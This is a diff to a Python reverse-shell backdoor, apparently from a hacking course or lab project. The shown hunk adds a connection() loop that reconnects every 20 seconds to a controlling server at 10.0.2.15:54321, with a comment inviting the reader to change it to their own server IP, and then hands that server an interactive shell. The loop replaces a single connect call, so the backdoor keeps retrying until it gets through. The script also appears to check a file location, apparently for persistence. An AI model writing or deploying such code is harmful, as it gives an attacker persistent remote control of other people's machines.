@@ -7,6 +7,7 @@ import os
 import base64
 import shutil
 import sys
+import time
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -20,6 +21,16 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            sock.connect(("10.0.2.15",54321))#Change to Server IP
+            shell()
+        except:
+            connection()
+
 
 def shell():
     while True:
@@ -50,8 +61,7 @@ if not os.path.exists(location):
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("10.0.2.15",54321))#Change to Server IP
 
-shell()
+connection()
 
 sock.close()
